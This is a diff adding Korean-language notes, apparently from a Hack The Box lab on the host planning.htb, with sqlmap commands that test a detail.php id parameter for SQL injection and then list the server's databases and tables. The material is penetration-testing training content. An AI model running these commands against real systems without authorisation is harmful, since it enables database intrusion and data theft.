@@ -97,3 +97,15 @@ Error: error on running gobuster: failed to get number of lines: read /usr/share
 # - -w       : 워드리스트 경로 (기본 디렉토리/파일 리스트)
 # - -t       : 쓰레드 수 (속도 조절)
 # - -o       : 결과 출력 파일 지정
+
+# 1. 기본 SQL 인젝션 검사
+# URL의 id 파라미터가 SQL 인젝션 취약한지 자동 검사
+sqlmap -u "http://planning.htb/detail.php?id=1" --batch
+
+# 2. 데이터베이스 목록 추출
+# 취약점 발견 시 서버 내 모든 DB 이름 추출
+sqlmap -u "http://planning.htb/detail.php?id=1" --dbs --batch
+
+# 3. 특정 DB의 테이블 목록 추출
+# 지정한 DB의 모든 테이블 이름 추출
+sqlmap -u "http://planning.htb/detail.php?id=1" -D database_name --tables --batch
